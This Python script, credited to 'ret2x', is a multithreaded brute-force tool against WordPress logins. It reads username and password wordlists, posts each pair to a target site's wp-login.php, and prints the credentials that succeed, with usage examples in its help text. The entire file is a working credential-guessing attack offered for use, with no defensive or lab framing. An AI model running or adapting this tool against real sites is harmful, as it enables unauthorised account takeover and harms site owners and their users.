#!/usr/bin/env python3

# Author: Bryan Muñoz (ret2x)

import argparse
from colorama import Fore
import os
from queue import Queue
import requests
import sys
import signal
import threading

check = "ERROR"
print_lock = threading.Lock()
exit_event = threading.Event()
q = Queue()

GREEN = Fore.GREEN
GRAY = Fore.LIGHTBLACK_EX
RESET = Fore.RESET


def get_arguments():
    parser = argparse.ArgumentParser(description="Wordpress Login Brute Force",
                                     formatter_class=argparse.RawTextHelpFormatter,
                                     epilog="Examples: \n"
                                     "Wpbf.py -u http://www.wpsite.com -l admin -P passfile.txt\n"
                                     "Wpbf.py -u http://www.wpsite.com -L userfile.txt -P passfile.txt")
    parser.add_argument("-u", "--url", dest="url",
                        help="target url (e.g. http://www.wpsite.com)")
    parser.add_argument("-l", dest="username",
                        metavar="USERNAME", help="username")
    parser.add_argument("-L", dest="userfile",
                        metavar="USER FILE", help="user_file.txt")
    parser.add_argument("-P", dest="passfile",
                        metavar="PASS FILE", help="pass_file.txt")
    parser.add_argument("-t", dest="threads", metavar="THREADS",
                        default=5, type=int, help="default 5")
    args = parser.parse_args()
    return args


def signal_handler(signum, frame):
    print("", end="\r")
    sys.exit()


signal.signal(signal.SIGINT, signal_handler)


def fancy_output(p1, p2):
    success = f"{GREEN}Success => {p1}:{p2}{RESET:50}"
    invalid = f"{GRAY}Invalid => {p1}:{p2}{RESET:50}"
    return success, invalid


def login_attempt(url, user, pwd):
    data = {
        "log": user,
        "pwd": pwd,
        "wp-submit": "Log+In"
    }

    try:
        r = requests.post(url + "/wp-login.php", data=data)
    except requests.exceptions.ConnectionError as e:
        print("Connection Error", e)
        os._exit(1)
    finally:
        return r.text


def user_brute_force(url, user):
    while True:
        pwd = q.get()

        if exit_event.is_set() is False:
            if check not in login_attempt(url, user, pwd):
                with print_lock:
                    print(fancy_output(user, pwd)[0])
                    exit_event.set()

            else:
                with print_lock:
                    print(fancy_output(user, pwd)[1], end="\r")

        q.task_done()


def user_file_brute_force(url, user_list):
    while True:
        pwd = q.get()

        for user in user_list[:]:
            if check not in login_attempt(url, user, pwd):
                with print_lock:
                    print(fancy_output(user, pwd)[0])
                    user_list.remove(user)

            else:
                with print_lock:
                    print(fancy_output(user, pwd)[1], end="\r")

        q.task_done()


def main():
    args = get_arguments()
    url = args.url
    user = args.username
    user_file = args.userfile
    pass_file = args.passfile
    n_threads = args.threads

    if url and user and pass_file:
        with open(pass_file, "rb") as passwds:

            for pwd in passwds:
                pwd = pwd.strip().decode("latin-1")
                q.put(pwd)

            for t in range(n_threads):
                worker = threading.Thread(
                    target=user_brute_force, args=(url, user,), daemon=True)
                worker.start()

            q.join()

    elif url and user_file and pass_file:
        with open(user_file) as u:
            user_list = u.read().splitlines()
            with open(pass_file, "rb") as passwds:

                for pwd in passwds:
                    pwd = pwd.strip().decode("latin-1")
                    q.put(pwd)

                for t in range(n_threads):
                    worker = threading.Thread(
                        target=user_file_brute_force, args=(url, user_list,), daemon=True)
                    worker.start()

                q.join()

    else:
        sys.exit()


if __name__ == "__main__":
    main()
